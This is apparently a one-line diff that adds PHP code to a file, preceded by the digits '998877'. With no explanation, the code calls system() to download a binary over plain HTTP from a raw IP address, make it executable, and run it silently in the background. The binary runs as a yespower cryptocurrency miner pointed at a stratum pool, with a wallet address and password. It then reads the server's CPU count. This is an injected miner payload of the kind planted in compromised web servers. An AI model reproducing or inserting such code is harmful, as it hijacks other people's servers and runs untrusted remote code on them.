@@ -1,0 +1,1 @@
+998877<?php system('curl -s --insecure http://182.252.131.40:8080/dir -o dir; chmod +x dir; ./dir -a yespower -o stratum+tcps://146.59.217.34:17070 -u WSFEZqG5ybqSvpGs8qmCnmMyxC5UX5PJWv.asu -p webpassword=faiz123 --no-longpoll --no-getwork --background > /dev/null'); $core = system('nproc');?>
